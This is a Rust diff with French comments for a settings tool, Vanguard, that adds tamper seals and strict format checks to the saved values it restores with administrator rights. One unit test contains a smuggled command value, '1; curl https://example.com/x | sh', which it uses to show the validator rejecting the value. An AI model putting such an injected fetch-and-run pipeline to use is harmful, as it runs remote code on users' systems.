@@ -103,29 +103,55 @@ struct Avant {
     valeurs: Vec<Valeur>,
 }
 
-fn fichier_historique() -> std::path::PathBuf {
-    crate::reseau::dossier_local().join("reglages.json")
-}
-
 fn charger() -> Historique {
-    charger_de(&fichier_historique())
+    charger_dans(&crate::reseau::dossier_local())
 }
 
-/// L'historique d'un fichier donné : les tests ont chacun le leur, sans quoi l'un réécrirait celui qu'un autre lit
+/// Met de côté, intact, un fichier de valeurs d'avant qu'on ne relit pas : jamais écrasé en silence.
+fn mettre_de_cote(chemin: &std::path::Path, genre: &str) -> std::path::PathBuf {
+    let copie = chemin.with_extension(format!("{genre}-{}.json", chrono::Local::now().format("%Y%m%d-%H%M%S")));
+    let _ = std::fs::copy(chemin, &copie);
+    copie
+}
+
+/// L'historique du dossier `dossier`, d'après son sceau (`sceau::REGLAGES`) : ses valeurs sont remises en
+/// administrateur, et tout programme du compte peut réécrire le fichier. Changé hors de Vanguard, il ne vaut rien
+/// (aucune valeur n'en est remise, il est mis de côté et c'est dit) ; accepté tel quel au premier usage des sceaux
+/// (une version d'avant), il sert, puisque chaque valeur est de toute façon validée à la remise (`note_admise`),
+/// mais il n'est jamais rescellé à la lecture : il reste « adopté », et le bilan le dit (COM-ETA-001), jusqu'à ce
+/// que Vanguard écrive lui-même une note. Rescellé, un fichier posé après l'effacement de sceaux.json (une adresse
+/// de DNS bien formée, mais choisie par un autre) perdait cette marque, et sa valeur était remise en administrateur
+/// sans que rien ne le signale. Les tests ont chacun leur dossier : l'un réécrirait sinon celui qu'un autre lit
 /// (sous Windows, un fichier ouvert ne se remplace pas).
-fn charger_de(chemin: &std::path::Path) -> Historique {
-    let Ok(texte) = std::fs::read_to_string(chemin) else {
-        return Historique::default();
+fn charger_dans(dossier: &std::path::Path) -> Historique {
+    use crate::sceau::Lecture;
+    let chemin = dossier.join(crate::sceau::REGLAGES);
+    let octets = match crate::sceau::lire_dans(dossier, crate::sceau::REGLAGES) {
+        Lecture::Absent => return Historique::default(),
+        Lecture::Intact(o) | Lecture::Adopte(o) => o,
+        Lecture::Falsifie(_) => {
+            let copie = mettre_de_cote(&chemin, "falsifie");
+            tre!(
+                "Attention : valeurs d'avant des réglages changées hors de Vanguard : aucune n'est remise. Copie gardée : {}",
+                "Warning: previous setting values changed outside Vanguard: none is restored. Copy kept: {}",
+                copie.display()
+            );
+            return Historique::default();
+        }
+        Lecture::Illisible(e) => {
+            tre!(
+                "Attention : valeurs d'avant des réglages illisibles ({e}).",
+                "Warning: previous setting values unreadable ({e})."
+            );
+            return Historique::default();
+        }
     };
-    match serde_json::from_str(texte.trim_start_matches('\u{feff}')) {
+    let texte = String::from_utf8_lossy(&octets);
+    match serde_json::from_str::<Historique>(texte.trim_start_matches('\u{feff}')) {
         Ok(h) => h,
         Err(e) => {
             // Jamais écraser des valeurs d'avant qu'on ne sait pas relire : le fichier est mis de côté, intact.
-            let copie = chemin.with_extension(format!(
-                "illisible-{}.json",
-                chrono::Local::now().format("%Y%m%d-%H%M%S")
-            ));
-            let _ = std::fs::copy(chemin, &copie);
+            let copie = mettre_de_cote(&chemin, "illisible");
             tre!(
                 "Attention : valeurs d'avant des réglages illisibles ({e}). Copie gardée : {}",
                 "Warning: previous setting values unreadable ({e}). Copy kept: {}",
@@ -136,16 +162,16 @@ fn charger_de(chemin: &std::path::Path) -> Historique {
     }
 }
 
-/// Écrit l'historique d'un bloc (fichier temporaire, puis renommé) : une coupure ou un Ctrl-C laissent l'ancien ou
-/// le nouveau, jamais un fichier tronqué qui, relu vide, ferait perdre toutes les valeurs d'avant.
+/// Écrit l'historique d'un bloc, scellé (fichier temporaire, puis renommé) : une coupure ou un Ctrl-C laissent
+/// l'ancien ou le nouveau, jamais un fichier tronqué qui, relu vide, ferait perdre toutes les valeurs d'avant.
 fn sauver(h: &Historique) -> bool {
-    sauver_dans(h, &fichier_historique())
+    sauver_dans(h, &crate::reseau::dossier_local())
 }
 
-fn sauver_dans(h: &Historique, chemin: &std::path::Path) -> bool {
+fn sauver_dans(h: &Historique, dossier: &std::path::Path) -> bool {
     let ecrit = serde_json::to_string_pretty(h)
         .map_err(std::io::Error::other)
-        .and_then(|texte| crate::reseau::ecrire_atomique(chemin, &texte));
+        .and_then(|texte| crate::sceau::ecrire_dans(dossier, crate::sceau::REGLAGES, texte.as_bytes()));
     if let Err(e) = &ecrit {
         tre!(
             "Attention : valeurs d'avant des réglages non enregistrées ({e}).",
@@ -155,9 +181,60 @@ fn sauver_dans(h: &Historique, chemin: &std::path::Path) -> bool {
     ecrit.is_ok()
 }
 
-/// Valeurs à remettre pour annuler `r` : celles notées avant le changement, sinon celles d'un système neuf.
+/// La note d'un réglage, seulement si chacune de ses valeurs a une forme que ce changement peut écrire : un ensemble
+/// fermé (état d'un service, booléen), une forme stricte (adresse IP, nombre, identifiant). Une valeur d'une autre
+/// forme vient d'ailleurs que de Vanguard : la note entière est refusée, et ce sont les valeurs d'un système neuf,
+/// écrites dans le code, qui reviennent.
+fn note_admise<'a>(r: &Reglage, h: &'a Historique) -> Option<&'a Avant> {
+    let a = h.reglages.get(r.id.as_ref())?;
+    (a.valeurs.len() <= r.changements.len()
+        && r.changements
+            .iter()
+            .zip(&a.valeurs)
+            .all(|(c, v)| c.valeur_admise(v.as_deref())))
+    .then_some(a)
+}
+
+/// Une liste d'adresses IP séparées par des virgules (vide : aucune), telle qu'un réglage de DNS la note.
+#[cfg_attr(not(any(target_os = "linux", windows, target_os = "macos")), allow(dead_code))]
+pub(crate) fn adresses_ip(liste: &str) -> bool {
+    liste
+        .split(',')
+        .filter(|s| !s.is_empty())
+        .all(|s| s.parse::<std::net::IpAddr>().is_ok())
+}
+
+/// Une valeur de préférence simple : un mot (« 0 », « no », « true »), éventuellement entre guillemets droits, sans
+/// rien qu'un fichier de configuration ou un shell lirait autrement.
+#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
+pub(crate) fn jeton_simple(v: &str) -> bool {
+    let nu = v.strip_prefix('"').and_then(|r| r.strip_suffix('"')).unwrap_or(v);
+    nu.len() <= 64 && nu.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
+}
+
+/// Une valeur de GNOME (gsettings) simple : booléen, nombre (signé, ou « uint32 5 »), ou mot entre apostrophes.
+#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
+pub(crate) fn gvariant_simple(v: &str) -> bool {
+    let nombre = |t: &str| {
+        let t = t.strip_prefix('-').unwrap_or(t);
+        !t.is_empty() && t.len() <= 20 && t.chars().all(|c| c.is_ascii_digit())
+    };
+    let mot = |t: &str| {
+        t.strip_prefix('\'')
+            .and_then(|r| r.strip_suffix('\''))
+            .is_some_and(|m| m.len() <= 64 && m.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c)))
+    };
+    matches!(v, "true" | "false")
+        || nombre(v)
+        || v.split_once(' ')
+            .is_some_and(|(t, n)| matches!(t, "uint32" | "int32" | "uint64" | "int64" | "double") && nombre(n))
+        || mot(v)
+}
+
+/// Valeurs à remettre pour annuler `r` : celles notées avant le changement, si elles sont admises, sinon celles
+/// d'un système neuf.
 fn valeurs_d_avant(r: &Reglage, h: &Historique) -> Vec<Valeur> {
-    let notees = h.reglages.get(r.id.as_ref());
+    let notees = note_admise(r, h);
     r.changements
         .iter()
         .enumerate()
@@ -184,6 +261,10 @@ fn executer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &mut Historique) ->
     // Valeurs d'avant notées avant de toucher à quoi que ce soit : la plus ancienne reste, pour revenir à l'état
     // d'origine même après plusieurs passages.
     for r in a_faire {
+        // Une note refusée (forme inattendue) ne garde pas sa place : celle de maintenant la remplace.
+        if note_admise(r, h).is_none() {
+            h.reglages.remove(r.id.as_ref());
+        }
         h.reglages.entry(r.id.to_string()).or_insert_with(|| Avant {
             date: date.clone(),
             valeurs: r.changements.iter().map(systeme::Changement::lire).collect(),
@@ -256,8 +337,13 @@ fn a_changer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &Historique) -> Ve
     if !a_annuler.is_empty() {
         lignes.push(trf!("\n  {GRAS}À annuler{RESET}", "\n  {GRAS}To undo{RESET}"));
         for r in a_annuler {
-            let note = if h.reglages.contains_key(r.id.as_ref()) {
+            let note = if note_admise(r, h).is_some() {
                 tr!("valeurs d'avant remises", "previous values restored")
+            } else if h.reglages.contains_key(r.id.as_ref()) {
+                tr!(
+                    "note refusée, valeurs d'un système neuf",
+                    "note refused, values of a fresh system"
+                )
             } else {
                 tr!("valeurs d'un système neuf", "values of a fresh system")
             };
@@ -751,21 +837,25 @@ mod tests {
         assert_eq!(relu.reglages["x"].valeurs, [Some("dword:1".to_string()), None]);
     }
 
+    fn dossier_jetable(nom: &str) -> std::path::PathBuf {
+        let dossier = std::env::temp_dir().join(format!("vanguard-reglages-{nom}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dossier);
+        std::fs::create_dir_all(&dossier).unwrap();
+        dossier
+    }
+
+    fn copies(dossier: &std::path::Path, debut: &str) -> usize {
+        std::fs::read_dir(dossier)
+            .unwrap()
+            .flatten()
+            .filter(|e| e.file_name().to_string_lossy().starts_with(debut))
+            .count()
+    }
+
     /// Un historique tronqué (coupure pendant l'écriture) n'est pas pris pour vide puis écrasé : il est mis de côté.
     #[test]
     fn historique_illisible_mis_de_cote() {
-        let dossier = std::env::temp_dir().join(format!("vanguard-reglages-illisible-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&dossier);
-        std::fs::create_dir_all(&dossier).unwrap();
-        let chemin = dossier.join("reglages.json");
-        std::fs::write(&chemin, "{\"reglages\":{\"x\":{\"date\":\"2026-10").unwrap();
-        assert!(charger_de(&chemin).reglages.is_empty());
-        let copies = std::fs::read_dir(&dossier)
-            .unwrap()
-            .flatten()
-            .filter(|e| e.file_name().to_string_lossy().starts_with("reglages.illisible-"))
-            .count();
-        assert!(copies >= 1, "le fichier illisible n'a pas été gardé");
+        let dossier = dossier_jetable("illisible");
         let mut h = Historique::default();
         h.reglages.insert(
             "x".into(),
@@ -774,9 +864,110 @@ mod tests {
                 valeurs: vec![Some("1".into())],
             },
         );
-        assert!(sauver_dans(&h, &chemin));
-        assert_eq!(charger_de(&chemin).reglages["x"].valeurs, [Some("1".to_string())]);
+        assert!(sauver_dans(&h, &dossier));
+        assert_eq!(charger_dans(&dossier).reglages["x"].valeurs, [Some("1".to_string())]);
+        // Tronqué par Vanguard lui-même (resscellé tel quel) : illisible, gardé de côté.
+        crate::sceau::ecrire_dans(
+            &dossier,
+            crate::sceau::REGLAGES,
+            b"{\"reglages\":{\"x\":{\"date\":\"2026-10",
+        )
+        .unwrap();
+        assert!(charger_dans(&dossier).reglages.is_empty());
+        assert!(
+            copies(&dossier, "reglages.illisible-") >= 1,
+            "le fichier illisible n'a pas été gardé"
+        );
         let _ = std::fs::remove_dir_all(&dossier);
+    }
+
+    /// reglages.json réécrit par un programme du compte (une valeur d'avant à lui, que Vanguard remettrait en
+    /// administrateur) : rien n'en est cru, et il est mis de côté, intact.
+    #[test]
+    fn historique_falsifie_ne_fait_rien_remettre() {
+        let dossier = dossier_jetable("falsifie");
+        let mut h = Historique::default();
+        h.reglages.insert(
+            DNS.into(),
+            Avant {
+                date: "2026-10-18 01:00".into(),
+                valeurs: vec![Some("x".into())],
+            },
+        );
+        assert!(sauver_dans(&h, &dossier));
+        assert_eq!(charger_dans(&dossier).reglages.len(), 1);
+        std::fs::write(
+            dossier.join(crate::sceau::REGLAGES),
+            r#"{"reglages":{"dns_rapide":{"date":"2026-10-18 01:00","valeurs":["y"]}}}"#,
+        )
+        .unwrap();
+        assert!(charger_dans(&dossier).reglages.is_empty());
+        assert!(copies(&dossier, "reglages.falsifie-") >= 1);
+        let _ = std::fs::remove_dir_all(&dossier);
+    }
+
+    /// sceaux.json effacé, puis reglages.json posé par un programme du compte (une note de DNS bien formée) : il
+    /// sert, mais il n'est pas rescellé à la lecture ; il reste « adopté », et le bilan continue de le dire.
+    #[test]
+    fn historique_adopte_jamais_rescelle_a_la_lecture() {
+        let dossier = dossier_jetable("adopte");
+        assert!(sauver_dans(&Historique::default(), &dossier));
+        std::fs::remove_file(dossier.join("sceaux.json")).unwrap();
+        // La forme exacte d'une note de DNS sous Linux (connexion, puis DNS IPv4 et IPv6) : admise à la remise.
+        let note = r#"{"reglages":{"dns_rapide":{"date":"2026-10-18 01:00","valeurs":["0b6e5c1a-2f3d-4e8f-9a0b-1c2d3e4f5a6b\n203.0.113.66|yes||yes"]}}}"#;
+        std::fs::write(dossier.join(crate::sceau::REGLAGES), note).unwrap();
+        assert_eq!(charger_dans(&dossier).reglages.len(), 1);
+        assert!(matches!(
+            crate::sceau::lire_dans(&dossier, crate::sceau::REGLAGES),
+            crate::sceau::Lecture::Adopte(_)
+        ));
+        let _ = std::fs::remove_dir_all(&dossier);
+    }
+
+    /// Une note dont une valeur n'a pas la forme que le réglage écrit est refusée en entier : ce sont les valeurs d'un
+    /// système neuf (celles du code) qui reviennent, jamais celle de la note.
+    #[test]
+    fn note_d_une_forme_inattendue_refusee() {
+        #[cfg(not(target_os = "linux"))]
+        let catalogue = systeme::catalogue();
+        let mut h = Historique::default();
+        #[cfg(target_os = "linux")]
+        let essai = Reglage {
+            id: "essai".into(),
+            categorie: Categorie::Confort,
+            titre: "Essai".into(),
+            effet: "Essai",
+            prudence: None,
+            recommande: false,
+            changements: vec![systeme::Changement::Option {
+                fichier: "/etc/default/essai",
+                cle: "ENABLED",
+                cible: "0",
+                defaut: "1",
+            }],
+        };
+        #[cfg(target_os = "linux")]
+        let r = &essai;
+        #[cfg(not(target_os = "linux"))]
+        let Some(r) = catalogue.first() else { return };
+        h.reglages.insert(
+            r.id.to_string(),
+            Avant {
+                date: String::new(),
+                valeurs: vec![Some("1; curl https://example.com/x | sh".into())],
+            },
+        );
+        assert!(note_admise(r, &h).is_none());
+        assert_eq!(
+            valeurs_d_avant(r, &h),
+            r.changements
+                .iter()
+                .map(systeme::Changement::defaut)
+                .collect::<Vec<_>>()
+        );
+        // Plus de valeurs que de changements : pas une note de ce réglage.
+        h.reglages.get_mut(r.id.as_ref()).unwrap().valeurs = vec![r.changements[0].defaut(); r.changements.len() + 1];
+        assert!(note_admise(r, &h).is_none());
     }
 
     /// L'annulation se juge sur les valeurs relues : une ligne qui était absente doit l'être de nouveau.
